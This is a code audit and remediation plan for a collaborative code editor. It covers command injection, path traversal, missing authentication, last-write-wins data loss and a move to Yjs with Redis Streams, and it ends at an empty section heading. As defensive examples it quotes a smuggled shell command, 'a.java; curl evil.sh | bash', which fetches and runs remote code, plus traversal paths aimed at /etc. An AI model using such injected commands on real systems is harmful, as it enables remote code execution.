# CollabCode — Code Audit & Remediation Plan

**Date:** 2026-10-15
**Scope:** `editor-backend` (Spring Boot 3.3.10 / Java 17) and `editor-frontend` (React 19 / Vite 6 / Monaco)
**Status:** Audit complete, remediation not yet started

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Audit Findings](#2-audit-findings)
   - [2.1 Critical — Security](#21-critical--security)
   - [2.2 Critical — Collaboration Correctness](#22-critical--collaboration-correctness)
   - [2.3 Critical — Infrastructure](#23-critical--infrastructure)
   - [2.4 Medium](#24-medium)
3. [Target Architecture](#3-target-architecture)
4. [Phase 0 — Security & Hygiene](#4-phase-0--security--hygiene)
5. [Phase 1 — Execution Abstraction & Hardening](#5-phase-1--execution-abstraction--hardening)
6. [Phase 2 — CRDT Backend (Redis Streams)](#6-phase-2--crdt-backend-redis-streams)
7. [Phase 3 — CRDT Frontend (Yjs + y-monaco)](#7-phase-3--crdt-frontend-yjs--y-monaco)
8. [Phase 4 — Reliability & Observability](#8-phase-4--reliability--observability)
9. [Phase 5 — Tests & CI](#9-phase-5--tests--ci)
10. [Sequencing & Dependencies](#10-sequencing--dependencies)
11. [Open Risks & Decisions](#11-open-risks--decisions)

---

## 1. Executive Summary

CollabCode is a Google-Collab-style collaborative code editor. A React/Monaco frontend talks to a Spring Boot backend over WebSockets; Redis pub/sub fans messages across multiple backend instances because a WebSocket connection is bound to one server.

The architecture is sound in outline but the implementation has **no concurrency-control algorithm of any kind**. There is no operational transformation (OT) and no conflict-free replicated data type (CRDT). Collaboration is implemented as *last-write-wins on the entire file as a string*, which silently destroys concurrent work. This is not a rare race condition — it is the normal experience whenever two people type at the same time.

Separately, the audit found a remote code execution vulnerability via shell command injection, path traversal on code execution, a complete absence of authentication, live production credentials in the working tree, and several correctness bugs including a file-rename path that persists changes but never broadcasts them.

**Three things require attention ahead of all feature work:**

1. **Rotate the Aiven Postgres password and the Upstash Redis token immediately.** Both are present in plaintext in the working tree.
2. **The execution endpoint is remotely exploitable.** Fix before any public deployment.
3. **Collaboration loses user data.** Adopt Yjs + Redis Streams (Phase 2/3).

Authentication is explicitly **out of scope** for this plan per current direction; the plan still removes the client-supplied `sessionId` trust issue, because that is a correctness/input-validation defect rather than an access-control feature.

---

## 2. Audit Findings

### 2.1 Critical — Security

#### 2.1.1 Live production credentials in source

`editor-backend/src/main/resources/application.properties` contains a real Aiven PostgreSQL password and an Upstash Redis token. The same Redis token is duplicated as a hardcoded Java string literal in `WebSocketHandler.java:29` and `:32`, overriding the config property that was commented out immediately above it.

```properties
# values redacted - see git working tree history for the originals
spring.datasource.password=<REDACTED - Aiven Postgres password>
spring.data.redis.password=<REDACTED - Upstash Redis token>
```

**Good news:** these values were present only in the working tree. `git log -S` confirms they were **not** in any committed blob — both files showed as modified but uncommitted. There is no need to rewrite git history.

**Action:** rotate both credentials now, then move to environment variables with safe local defaults. Completed in Phase 0; rotation itself is a manual step in the Aiven and Upstash consoles.

#### 2.1.2 Remote code execution via command injection

`SandboxExecutionService.java:37-38` splices the client-supplied `entrypoint` directly into a shell command string:

```java
firejailCmd = String.join(" ",
        "firejail --private --net=none --rlimit-cpu=2 --rlimit-as=268435456 --quiet",
        "bash -c \"javac", entry, "&& java -cp", tempDir.toAbsolutePath().toString(),
        entry.replace(".java",""), "\""
);
```

An `entrypoint` of `a.java; curl evil.sh | bash` is interpolated verbatim into the `bash -c` string and executed. `DockerExecutionService.java:41` and `:77` contain the identical flaw.

There is no validation of `language`, `entrypoint`, or file content anywhere in the request path. `firejail --private` provides a filesystem namespace but does **not** prevent arbitrary command execution within that namespace — the injected command runs as the same user with the same sandbox permissions.

#### 2.1.3 Path traversal on code execution

`SandboxExecutionService.java:24` and `DockerExecutionService.java:22-24`:

```java
Path filePath = tempDir.resolve(file.getPath());   // file.getPath() is client-controlled
Files.createDirectories(filePath.getParent());
Files.writeString(filePath, file.getContent());
```

A `path` of `../../etc/cron.d/x` resolves outside the temporary run directory, and `createDirectories` will create the intermediate directories to make the traversal succeed. No normalization or containment assertion is performed.

#### 2.1.4 No authentication anywhere

- `WebSocketConfig.java:21` — `setAllowedOrigins("*")`
- No Spring Security dependency in `pom.xml`
- No auth filter, no token validation, no ownership check on any endpoint

Session UUIDs are the only secret, and they are deliberately shared via the "Join Code" copy button in the UI (`Editor.jsx:36-41`).

Two endpoints are exploitable without any secret at all:

- `POST /api/sessions/bulk` (`SessionController.java:70-78`) accepts a list of `FileEntity` objects whose `id.sessionId` is read from the **request body**. Anyone can write files into any session.
- `DELETE /api/sessions/{id}` (`SessionController.java:81-89`) — anyone can delete any session.

#### 2.1.5 Session-ID spoofing over WebSocket

`WebSocketHandler.java:151` reads `sessionId` from the **incoming message body** rather than the value bound at connection time:

```java
String sessionId = (String) msg.get("sessionId");
```

`extractSessionId` correctly parses the session ID from the handshake query string at `afterConnectionEstablished` (`:122`), but that value is then discarded in favour of whatever the client claims in each message. A client can lie in the payload and broadcast into a different session's room.

**This is fixed in Phase 2 independently of the auth decision**, because it is an input-validation defect, not an access-control feature.

#### 2.1.6 Placeholder TLS certificate

`ca.pem` in `src/main/resources/` is 34 bytes — a placeholder, not a real CA bundle — while `application.properties` sets `sslmode=require&sslrootcert=./ca.pem`. Certificate validation against Aiven will fail at runtime.

#### 2.1.7 Container hardening

`editor-backend/Dockerfile` runs as root, declares no resource limits, and bundles `spring-boot-devtools` (a runtime-scoped dependency intended for local development).

---

### 2.2 Critical — Collaboration Correctness

#### 2.2.1 There is no OT and no CRDT — this is the core defect

Verified by inspection of `editor-frontend/package.json`: there is no `yjs`, `y-monaco`, `monaco-yjs`, `ot-json0`, `ot-text`, `share-codemirror`, or any equivalent dependency.

The synchronisation model is **last-write-wins on the whole file as a string**. The full round trip:

**Outbound** — `CodeEditor.jsx:49-62`, on every `onDidChangeModelContent`:

```js
lastTimeoutRef.current = setTimeout(() => {
  onCodeChange(filenameRef.current, editor.getValue());   // ENTIRE document
}, 150);
```

**Inbound** — `Editor.jsx:54-61`, on receiving a remote `edit`:

```js
setFiles((prev) => ({
  ...prev,
  [filename]: content        // wholesale replacement of local buffer
}));
```

The only protection against echo is `externalUpdateRef`, which suppresses **exactly one** subsequent `onDidChangeModelContent` event (`CodeEditor.jsx:51-54`).

**Consequences:**

- Two people typing within the same interval → one's entire buffer overwrites the other's. Characters are silently lost with no conflict marker, no undo path, and no notification.
- If a remote update lands while a user is mid-sentence, the in-flight keystrokes are swallowed as if they were an echo of the incoming change — the `externalUpdateRef` guard consumes a real local keystroke.
- There is no version vector, no transformation function, no rebase, and no reordering.

**This is not a rare race.** It is the default experience with two or more concurrent editors.

#### 2.2.2 Two competing unsynchronised send timers

`CodeEditor.jsx:49-74` runs both a 150 ms debounce **and** a 3-second `setInterval`. The interval re-sends the editor contents whenever `typed.current` is set, independent of whether anything changed. `typed.current` is never reset on file switch, so switching files mid-typing can push the previous file's content under the new filename — a silent cross-file corruption path.

#### 2.2.3 Cursor/presence is a dead protocol branch

`WebSocketHandler.java:158` relays `type: "cursor"` messages, but the frontend **never sends one and never renders one**. No user names, colours, avatars, or presence indicators exist anywhere in the application.

#### 2.2.4 File rename is persisted but never broadcast

`WebSocketHandler.java:202-213` writes the rename to Redis and Postgres and then returns **without calling `publish()`**:

```java
private void handleRenameFile(String sessionId, Map<String,Object> msg, String senderId) {
    ...
    fileService.renameFile(sessionId, oldName, newName);
    // no publish(...) — other clients never learn about this
}
```

The rename is invisible to every other connected client. There is also no rename UI in the frontend at all (`FileStructure.jsx` offers only add, delete, and set-as-main).

#### 2.2.5 Stale-cache bug makes uploaded files invisible

`WebSocketHandler.java:129-137` loads files from Postgres only if the Redis hash is empty:

```java
Map<String, String> fileMap = hashOps.entries(redisKey);
if (fileMap.isEmpty()) {
    fileService.getFilesBySessionId(sessionId).forEach(...);
}
```

`POST /api/sessions/bulk` (`SessionController.java:70`) writes directly to Postgres and never touches Redis. Since the session-creation flow always seeds at least one `.keep` file (`Home.jsx:66-84`), the Redis hash is non-empty, so **uploaded project files never appear for any client that connects afterwards**.

#### 2.2.6 Run output pollutes the shared project tree

`Editor.jsx:128-139` writes execution output into a real file named `output.txt` inside the project and broadcasts it to all peers as an `edit` message:

```js
setFiles(prev => ({ ...prev, "output.txt": result }));
socketRef.current?.send(JSON.stringify({ type: "edit", filename: "output.txt", ... }));
```

Running code therefore mutates every collaborator's file tree, persists to the database, becomes part of subsequent "Export ZIP" downloads, and is included in subsequent execution payloads.

#### 2.2.7 The Run button is broken unconditionally

`Editor.jsx:105` references a bare `monaco` identifier that is never imported, and `index.html` loads no Monaco CDN script:

```js
if (!mainFile || !monaco) return;                     // ReferenceError, not a falsy check
const mainModelUri = monaco.Uri.file(currentFile).toString();
```

A bare undeclared identifier throws `ReferenceError` *before* the guard can evaluate. The `catch` block then writes the ReferenceError message into `output.txt`. The Run button has never worked.

#### 2.2.8 Editor remount destroys editing state

`CodeEditor.jsx:79-86` passes both `key={path}` and `value={content}`:

```jsx
<Editor key={path} value={content} path={path} ... />
```

`value` is not a controlled prop in `@monaco-editor/react`, and `key={path}` forces a full remount on every file switch — destroying cursor position, scroll offset, and undo history. Combined with 2.2.1, there is no coherent model of document ownership anywhere in the component.

#### 2.2.9 No reconnect, backoff, or offline queue

`Editor.jsx:43-83` opens the WebSocket once. There is no reconnect, no heartbeat, no backoff, and no offline queue. Render.com's free tier spins the instance down after inactivity, which drops connections; without a reconnect path the editor is permanently dead for that user until a manual page reload.

Compounding this, `ws.onopen` and `ws.onerror` are assigned **inside** the `ws.onmessage` handler (`Editor.jsx:75-80`), so they are registered after the connection event has already fired and never execute. There is no connection-state observability at all.

---

### 2.3 Critical — Infrastructure

#### 2.3.1 A new TLS connection is opened on every keystroke

`WebSocketHandler.java:221-228`:

```java
private void publishRaw(Map<String,Object> msg) {
    try (Jedis p = new Jedis(redisUrl)) {
        p.auth(redisPassword);
        p.publish(CHANNEL, new ObjectMapper().writeValueAsString(msg));
    }
}
```

Every keystroke from every user constructs a brand-new Jedis client and performs a full TLS handshake to Upstash. This will exhaust the Upstash request budget almost immediately and is a hard scaling blocker independent of the OT question.

#### 2.3.2 Fire-and-forget pub/sub loses messages permanently

Redis pub/sub has no persistence. During the reconnect backoff in `runSubscriberLoop` (`WebSocketHandler.java:87-101`, up to 30 seconds), **every message published in that window is permanently lost** — there is no replay and no backfill. A brief network blip silently corrupts a document for everyone connected to that instance.

#### 2.3.3 Unbounded memory leak on disconnect

`afterConnectionClosed` is **never overridden**. The `roomClients` and `sessionIds` maps (`WebSocketHandler.java:43-44`) therefore grow without bound, retaining dead `WebSocketSession` objects for the lifetime of the process. In a long-running instance this is a guaranteed OOM.

#### 2.3.4 Write-behind cache loses up to 10 seconds of edits

`flushModifiedFiles` (`WebSocketHandler.java:230-246`) runs on a 10-second schedule. A crash, deploy, or restart within that window loses every edit made since the last flush. Ordering is also not guaranteed relative to the immediate Postgres writes performed by `handleCreateFile` and `handleDeleteFile`.

#### 2.3.5 Whole-document payloads over a text channel

Broadcasting entire file contents as JSON strings is inefficient regardless of transport. CRDT updates are small, binary, and batchable; whole-file blobs are none of those things.

#### 2.3.6 Blocking Redis I/O on the WebSocket thread

`hashOps.put` in `handleEdit` (`WebSocketHandler.java:173`) performs a network round trip to Upstash on the WebSocket I/O thread, once per edit.

---

### 2.4 Medium

| # | Issue | Location |
|---|---|---|
| 2.4.1 | Hardcoded production URL `https://collabcode-backend-z04k.onrender.com` in 5 places across 3 files; no env var, so local development is impossible | `Editor.jsx` ×4, `Home.jsx` ×3 |
| 2.4.2 | `new ObjectMapper()` instantiated per message, inconsistently configured | `WebSocketHandler.java:58,140,148,224` |
| 2.4.3 | `extractSessionId` performs no URL decoding, no validation; `session.getUri().getQuery()` can be `null` → NPE | `WebSocketHandler.java:248-256` |
| 2.4.4 | No `setMaxTextMessageBufferSize`; no size cap on WS frames or HTTP request bodies → memory DoS | `WebSocketConfig.java` |
| 2.4.5 | `SandboxExecutionService` reads stdout **after** `waitFor` → deadlocks on the 64 KB pipe buffer, then loses output at the 5 s timeout | `SandboxExecutionService.java:64-76` |
| 2.4.6 | `DockerExecutionService` has **no timeout at all** and an unused `exitCode` | `DockerExecutionService.java:57` |
| 2.4.7 | Dead code: `DockerExecutionService` is never wired (controller uses `SandboxExecutionService`) but is still compiled and shipped | `service/DockerExecutionService.java` |
| 2.4.8 | `spring-boot-starter-data-jpa` pinned to `3.4.5` under a `3.3.10` parent → version mismatch | `pom.xml` |
| 2.4.9 | `deleteSession` does not cascade; `deleteAllFilesInSession` exists but is never called → orphaned rows | `SessionService.java:37-39` |
| 2.4.10 | No `@Transactional` anywhere; `renameFile` and `saveFiles` perform multi-step operations non-atomically | `service/` |
| 2.4.11 | 18 copy-pasted `try/catch(Exception) → 500 + e.getMessage()` blocks leak internal details, discard stack traces, and never log | `SessionController.java` |
| 2.4.12 | Untyped `Map<String,Object>` deserialization with `(String)` casts — a client sending `{"filename": 123}` triggers `ClassCastException` (caught, but a log-spam vector) | `WebSocketHandler.java:148-166` |
| 2.4.13 | No rate limiting on session creation → unbounded database growth | `SessionController.java:35-43` |
| 2.4.14 | `handleAdd` adds a file but never calls `setCurrentFile`, so new files cannot be opened | `Editor.jsx:150-165` |
| 2.4.15 | `init` picks `Object.keys(files)[0]` as both current and main file — nondeterministic, and can select `folder/.keep`, yielding `language: "keep"` → "Unsupported language" | `Editor.jsx:50-52` |
| 2.4.16 | Infinite "Joining the session…" spinner on any failure; no error or retry state | `Editor.jsx:192-196` |
| 2.4.17 | `FileUtils.postVisitDirectory` throws when `exc != null`, so cleanup failure inside `finally` masks the original exception and can leak temp dirs | `util/FileUtils.java` |
| 2.4.18 | `dockerImages/*/Dockerfile` reference images (`java-runner`, `python-runner`, `cpp-runner`) that nothing in the repo builds or tags; no CI exists | `dockerImages/` |
| 2.4.19 | Monaco web-worker configuration absent for Vite (`MonacoEnvironment.getWorker`) → degraded language services | `vite.config.js` |
| 2.4.20 | `.keep` folder-marker content is inconsistent: `"keep"` in `Home.jsx:73`, `""` in `FileStructure.jsx:88` | — |
| 2.4.21 | `getAllSessions` is implemented but no session-listing endpoint is exposed | `SessionService.java:33` |
| 2.4.22 | `SpringApplication` enables `@EnableScheduling`, but the scheduler is a raw `ScheduledExecutorService` constructed inside a `@Component` constructor — side effects in the constructor, non-daemon threads | `WebSocketHandler.java:40-41,82` |
| 2.4.23 | Only one test exists (`contextLoads`) and it requires live Postgres + Redis | `src/test/` |
| 2.4.24 | `ConfirmDelete` exports two components from one file and logs props on every render | `ConfirmDelete.jsx` |
| 2.4.25 | Stray debug CSS class `.hehe` | `FileStructure.jsx:106` |

---

## 3. Target Architecture

```
┌──────────────┐   Yjs updates (base64 binary)   ┌────────────────────────────────────────┐
│  React SPA   │ ──────────────────────────────► │  Spring Boot  (N instances)            │
│              │                                 │                                        │
│  Y.Doc       │ ◄────────────────────────────── │  ┌──────────────────────────────────┐  │
│  per session │      Redis Stream                │  │ TextWebSocketHandler  (thin)     │  │
│              │      collab:doc:{sessionId}     │  ├──────────────────────────────────┤  │
│  Y.Map<Y.Text>                                 │  │ RoomRegistry                     │  │
│  per file    │                                 │  │  ├ afterConnectionClosed cleanup │  │
│              │                                 │  ├──────────────────────────────────┤  │
│  Awareness   │ ──────────────────────────────► │  │ DocStreamService                │  │
│  (ephemeral) │      Redis pub/sub               │  │  XADD / XREAD / XACK             │  │
│              │      collab:aware:{sessionId}   │  ├──────────────────────────────────┤  │
└──────────────┘                                 │  │ AwarenessRelay  (pub/sub)       │  │
                                                 │  ├──────────────────────────────────┤  │
                                                 │  │ DocPersistenceService            │  │
                                                 │  │  doc_snapshots / doc_updates      │  │
                                                 │  ├──────────────────────────────────┤  │
                                                 │  │ ExecutionStrategy (abstract)      │  │
                                                 │  │  ├ ContainerExecutionStrategy     │  │
                                                 │  │  └ FirejailExecutionStrategy      │  │
                                                 │  └──────────────────────────────────┘  │
                                                 └────────────────────────────────────────┘
```

### Core design decision — the backend is CRDT-agnostic

The Java backend **never parses, merges, or interprets Yjs updates.** It treats them as opaque base64 blobs and does three things with them:

1. appends them to a durable, ordered Redis Stream,
2. fans them out to locally connected WebSocket clients,
3. persists them to Postgres.

All CRDT merging and convergence happens client-side inside Yjs. This has three benefits:

- **No Node sidecar and no Yjs-in-Java port.** The polyglot problem disappears entirely.
- **The server cannot corrupt a document**, because it never understands document structure.
- **Merging is order-independent.** Yjs updates are idempotent and commutative, so a client can rebuild any document by applying the snapshot followed by the deltas in sequence.

### Transport split — Streams for durable data, pub/sub for ephemeral state

| Channel | Transport | Rationale |
|---|---|---|
| Document updates | **Redis Stream** (`XADD`/`XREAD`/`XACK`) | Must survive consumer downtime; requires ordering and replay |
| Cursor/presence (awareness) | **Redis pub/sub** | Ephemeral by definition; must never be persisted or replayed |

This is the one place where keeping pub/sub is the *correct* choice, not a compromise — awareness state is meaningless if replayed late.

### Why not operational transformation

OT was considered and rejected in favour of a CRDT. The reasoning is recorded here so the decision is auditable:

| Criterion | OT | CRDT (Yjs) |
|---|---|---|
| Monaco integration | Requires custom operation-to-edit binding | `y-monaco` is a maintained, first-class binding |
| Central transform server | Required — must sequence every op | Not required |
| Offline / reconnect | Weak — divergent state needs server reconciliation | Strong — offline updates merge cleanly |
| Production pedigree | ShareDB, Google Wave | Google Docs, VS Code Live Share, CodeSandbox |
| Implementation risk | High — transformation logic is subtle and hard to test | Low — the hard part is a mature library |
| Bundle/complexity cost | Server logic burden | ~5 frontend dependencies |

For a Monaco-based editor with intermittent connectivity and Render.com's free-tier connection drops, the CRDT's offline and reconnect properties are decisive.

---

## 4. Phase 0 — Security & Hygiene

**Independent of everything else. Merge and ship immediately. Rotate the credentials today.**

| # | Change | Target |
|---|---|---|
| 0.1 | **Rotate the Aiven Postgres password and Upstash Redis token.** | — |
| 0.2 | Replace all credential literals with `${ENV:default}` form; commit `application.properties.example` with safe local defaults; add `application-local.properties` to `.gitignore`. | `application.properties` |
| 0.3 | Delete the hardcoded `redisUrl`/`redisPassword` fields and restore `@Value` injection. | `WebSocketHandler.java:28-32` |
| 0.4 | Fix the placeholder `ca.pem` (34 bytes) — supply the real Aiven CA bundle, or drop `sslrootcert` and use `sslmode=require`. | `resources/ca.pem` |
| 0.5 | **Delete `DockerExecutionService`** — dead code, still compiled and shipped. Its replacement arrives in Phase 1. | `service/DockerExecutionService.java` |
| 0.6 | Remove the explicit `spring-boot-starter-data-jpa` version; inherit `3.3.10` from the parent. | `pom.xml` |
| 0.7 | Remove `spring-boot-devtools` from the production image. | `Dockerfile`, `pom.xml` |
| 0.8 | Fix the `monaco` `ReferenceError` — add `import * as monaco from 'monaco-editor'` and configure Vite's `MonacoEnvironment.getWorker`. | `Editor.jsx:105`, `vite.config.js` |
| 0.9 | Move run output out of the project tree into a dedicated output panel. Fixes 2.2.6. | `Editor.jsx:128-139` |
| 0.10 | Move `ws.onopen`/`ws.onerror`/`ws.onclose` out of the `ws.onmessage` handler — they currently never fire. Fixes 2.2.9. | `Editor.jsx:46-81` |
| 0.11 | Externalise the 7 hardcoded backend URLs to `VITE_API_BASE`. | `Editor.jsx`, `Home.jsx` |
| 0.12 | Remove stray `console.log`s, the `.hehe` CSS class, and the dual export in `ConfirmDelete.jsx`. | `ConfirmDelete.jsx`, `FileStructure.jsx:106` |

**Exit criteria:** credentials rotated, working tree contains no secrets, `mvn package` and `npm run build` succeed, Run button functions.

---

## 5. Phase 1 — Execution Abstraction & Hardening

### 5.1 Structure

```
com.collabcode.editor.execution/
├── ExecutionStrategy.java            (abstract base)
├── ContainerExecutionStrategy.java    (isolated container per run)
├── FirejailExecutionStrategy.java     (hardened current approach)
├── ExecutionRequest.java             (validated input DTO)
├── ExecutionResult.java               (output, exitCode, truncated, durationMs)
└── ExecutionPathValidator.java        (shared traversal guard)
```

Strategy selection is driven by configuration, so the same artifact can run on a Docker-capable host or on Render.com's free tier:

```properties
collab.execution.type=firejail        # default
collab.execution.type=containerized
```

```java
@ConditionalOnProperty(name = "collab.execution.type", havingValue = "containerized")
```

### 5.2 Mandatory security fixes — applied to **both** strategies

These are non-negotiable and belong in the shared base class:

- **Path validation.** Reject absolute paths, `..` segments, NUL bytes, and symlinks. Resolve against the run directory and assert `resolved.normalize().startsWith(runDir)` before any write occurs. Fixes 2.1.3.
- **No shell strings.** Build the command as a `List<String>` argv passed to `ProcessBuilder`, eliminating the `bash -c` interpolation entirely. **This is the actual fix for 2.1.2** — whitelisting `entrypoint` is defence-in-depth, not a substitute.
- **Entrypoint whitelist.** Must match `^[A-Za-z0-9._-]{1,128}$` and carry an extension permitted for the target language.
- **Language whitelist.** An enum, not a free-form string reaching a `switch`.
- **Output caps.** Stream and truncate at 256 KB; set `truncated: true` on the result.
- **Hard timeout.** `waitFor(timeout)` → `destroyForcibly` → kill the full process tree.
- **Resource limits.** `--memory`, `--cpus`, `--pids-limit`, `--network none`, read-only rootfs.
- **Non-root user.** `USER sandbox` in the runner image.

### 5.3 Fix the stdout pipe deadlock

`SandboxExecutionService.java:64-76` calls `waitFor(5, SECONDS)` and only *then* reads stdout. If the child fills the 64 KB OS pipe buffer it blocks forever; the process never exits, the timeout fires, and the output is discarded.

**Fix:** drain stdout and stderr concurrently on two dedicated threads into a bounded buffer, then await the process.

### 5.4 Health endpoint

`GET /api/health` returning:

```json
{ "executionType": "firejail", "dockerAvailable": false,
  "redisConnected": true, "dbConnected": true }
```

This makes it observable from outside which strategy actually bound — essential given the strategy varies by environment.

---

## 6. Phase 2 — CRDT Backend (Redis Streams)

### 6.1 Schema changes

```sql
CREATE TABLE doc_snapshots (
    session_id VARCHAR(64) PRIMARY KEY,
    update      BYTEA       NOT NULL,
    seq         BIGINT      NOT NULL,
    updated_at  TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE TABLE doc_updates (
    session_id  VARCHAR(64)  NOT NULL,
    seq         BIGINT      NOT NULL,
    update      BYTEA       NOT NULL,
    created_at  TIMESTAMPTZ NOT NULL DEFAULT now(),
    PRIMARY KEY (session_id, seq)
);
```

Yjs updates are idempotent and commutative, so any client can rebuild a document by applying the snapshot followed by the deltas in `seq` order. The server never needs to merge them.

### 6.2 New classes — replacing the edit logic in `WebSocketHandler`

| Class | Responsibility |
|---|---|
| `DocStreamService` | `XADD collab:doc:{sid}`; `XREAD` via consumer group; `XACK` after local fan-out; `MAXLEN ~ 2000` trimming |
| `AwarenessRelay` | pub/sub on `collab:aware:{sid}` — ephemeral, deliberately never persisted |
| `DocPersistenceService` | Scheduled writer; writes to `doc_updates`; periodically requests and stores a compacted snapshot |
| `RoomRegistry` | `sessionId → Set<WebSocketSession>` with correct `afterConnectionClosed` cleanup (fixes 2.3.3) |
| `TextWebSocketHandler` | Thin envelope parser and fan-out. No business logic, no blocking Redis I/O on the I/O thread (fixes 2.3.6) |

> **Consumer-group configuration note.** This is fan-out, not work-queue distribution — *every* instance must observe *every* update. Each instance therefore needs its **own consumer group name**, derived from its instance ID. A single shared group would deliver each update to exactly one instance and silently break collaboration.

### 6.3 Wire protocol

```jsonc
// client -> server
{ "type": "update",   "update": "<base64>", "seq": 42 }
{ "type": "snapshot", "update": "<base64>" }          // response to compaction request
{ "type": "aware",    "payload": "<base64>" }          // cursors/presence, never persisted

// server -> client
{ "type": "sync",   "snapshot": "<base64>", "seq": 41, "fileTree": ["a.py", "lib/b.py"] }
{ "type": "update", "update": "<base64>", "seq": 42 }
{ "type": "aware",  "payload": "<base64>", "userId": "..." }
{ "type": "fileOp", "op": "add|delete|rename", "path": "a.py", "newPath": "c.py" }
```

**Backwards compatibility is deliberately not preserved.** This is a breaking protocol change; old clients receive an explicit version-mismatch error rather than silently corrupting a document.

### 6.4 Defects fixed in this phase

- Session ID taken from the **connection**, never from the message body (fixes 2.1.5).
- `afterConnectionClosed` properly implemented (fixes 2.3.3).
- One shared `ObjectMapper` bean (fixes 2.4.2).
- Per-session lock around the Redis read-modify-write.
- WebSocket frame size cap and HTTP request body caps (fixes 2.4.4).
- Bounded per-session room size.
- Typed message envelope with validated DTOs instead of `Map<String,Object>` with casts (fixes 2.4.12).
- Rename now broadcasts (fixes 2.2.4).
- Redis hash and Postgres kept consistent, so uploaded files are visible (fixes 2.2.5).

### 6.5 Collaborative file tree

`fileOp` messages replace the broken rename path. The file tree is stored in a `Y.Map`, so add/delete/rename operations converge automatically and are covered by the same CRDT machinery as file contents — rather than being a separate, hand-rolled, currently-broken code path.

---

## 7. Phase 3 — CRDT Frontend (Yjs + y-monaco)

**New dependencies:** `yjs`, `y-monaco`, `y-protocols`.

### 7.1 `useCollabSession.js` hook

Owns the `Y.Doc`, the WebSocket provider, the `Awareness` instance, and reconnect state.

**Returns:** `{ doc, files, tree, awareness, status, users }`

### 7.2 Binding

```js
const yFiles = doc.getMap('files')            // Y.Map<Y.Text>, keyed by path

// per file:
const yText = yFiles.get(path) ?? yFiles.set(path, new Y.Text())
MonacoBinding(yText, monacoModel, new Set([editor]), awareness)
```

Passing `awareness` into `MonacoBinding` gives **remote cursor and selection rendering for free**. This retires the dead `type:"cursor"` branch (2.2.3) and delivers the presence feature that was never finished.

### 7.3 Mechanisms being replaced

| Current (broken) | Replacement | Defect fixed |
|---|---|---|
| 150 ms debounce + 3 s `setInterval`, whole-document sends (`CodeEditor.jsx:49-74`) | `doc.on('update')` — Yjs emits already-batched incremental updates | 2.2.1, 2.2.2 |
| `setFiles({[filename]: content})` wholesale overwrite (`Editor.jsx:54-61`) | `Y.Text.applyDelta` — a true merge with zero character loss | 2.2.1 |
| `externalUpdateRef` one-shot echo guard (`CodeEditor.jsx:51-54`) | Deleted — Yjs tracks update origin, so local vs. remote is unambiguous | 2.2.1 |

### 7.4 Additional fixes

- **Editor lifecycle.** Bind the Monaco model once and swap the underlying `Y.Text`, instead of `key={path}` remounting the editor and destroying cursor, scroll, and undo history (2.2.8).
- **Deterministic init.** Sort the file list explicitly and select the first real source file as `mainFile`, rather than `Object.keys(...)[0]`, which can land on `folder/.keep` and produce `language: "keep"` (2.4.15).
- **`handleAdd` selects the new file** (2.4.14).
- **Replace the infinite spinner** with a real error and retry state (2.4.16).
- **Presence identity.** Generate a friendly random display name and colour per client.
- **Reconnect.** Exponential backoff with jitter, pause on `visibilitychange`, and rely on Yjs's own persistence for an offline queue. Updates composed offline merge cleanly on reconnect — which the current architecture cannot do at all (2.2.9).
- **Execution payloads read from the `Y.Doc`** so multi-file runs always compile against current content.

---

## 8. Phase 4 — Reliability & Observability

- Bounded output buffers for execution and bounded send queues for WebSocket clients.
- WebSocket send backpressure — a slow client must never block fan-out to the rest of the room.
- Graceful shutdown: drain in-flight Stream entries, stop the consumer group cleanly, stop non-daemon threads.
- `GET /api/health` (from Phase 1) plus a per-session debug endpoint reporting connected clients, consumer lag, and current document sequence number.
- Structured logging with session and actor IDs on all collaboration events.
- `@ControllerAdvice` replacing the 18 copy-pasted `try/catch → 500 + e.getMessage()` blocks; stop leaking internal messages to clients (2.4.11).
- `@Transactional` on `renameFile`, `saveFiles`, and session deletion (2.4.10).
- Cascade `deleteSession` → files, snapshots, and updates (2.4.9).
- Rate limiting on session creation (2.4.13).
- Fix `FileUtils.postVisitDirectory` so cleanup failure cannot mask the original exception (2.4.17).

---

## 9. Phase 5 — Tests & CI

### 9.1 Concurrency tests (the ones that matter)

- **20 simulated clients editing one file concurrently.** Assert all documents converge, no characters are lost, and the result is independent of message arrival order.
- This is precisely the test that would have caught the current last-write-wins design before it reached production.

### 9.2 Execution sandbox tests

Assert that `entrypoint = "a.java; id"` and `path = "../../etc/x"` are both rejected, and that output truncation and timeout enforcement behave correctly.

### 9.3 Redis Streams integration tests

Consumer-group fan-out correctness, and replay after consumer restart.

### 9.4 CI

GitHub Actions running `mvn verify`, `npm run lint`, and `npm run build`. Migrate `contextLoads` to Testcontainers so the build no longer requires live Postgres and Redis.

---

## 10. Sequencing & Dependencies

```
Phase 0 (security & hygiene)          ── independent, mergeable now
        │
        ├──► Phase 1 (execution)       ── independent, parallelisable with Phase 2
        │
        └──► Phase 2 (CRDT backend)    ──► Phase 3 (CRDT frontend)
                                             requires the Phase 2 protocol
                                                  │
Phase 4 (reliability) ◄───────────────────────────┘
Phase 5 (tests & CI)  ◄── continuous
```

- **Phase 0 ships on its own.** It requires no downstream work and closes the credential and RCE exposures.
- **Phases 1 and 2 are independent** and can be developed in parallel by different people.
- **Phase 3 is strictly blocked by Phase 2** — the frontend cannot bind to a protocol that does not exist yet.
- **Phases 4 and 5 are continuous.**

---

## 11. Open Risks & Decisions

### 11.1 Redis Streams on Upstash — verify before committing

Upstash supports Redis Streams, but confirm before building on it that your plan supports stream depth limits, consumer groups, and `XAUTOCLAIM` semantics as required. If not, a self-hosted Redis or a managed provider with stronger Streams support is the safer target for the document log.

Awareness traffic can remain on the existing free-tier pub/sub regardless — it is ephemeral and low-volume.

### 11.2 Yjs document growth requires compaction

Yjs updates are append-only and grow monotonically until compacted. Without compaction, long-lived sessions accumulate megabytes of dead operations and client memory and bandwidth degrade steadily.

The compaction handshake — server requests, a client responds with `Y.encodeStateAsUpdate`, server truncates the update log — **should be treated as required scope in Phase 2, not deferred as a follow-up.**

### 11.3 Authentication remains out of scope

Per current direction, no user accounts or session capability tokens are introduced in this plan. This leaves the endpoints identified in 2.1.4 open to anyone who learns a session ID.

Mitigating factors already included in the plan: session IDs are UUIDv4, and 2.1.5 is fixed so a client can no longer spoof its way into an arbitrary session.

**This is a known, accepted, and documented risk — not an oversight.** It should be revisited before any public or multi-tenant launch.

### 11.4 Render.com free-tier constraints

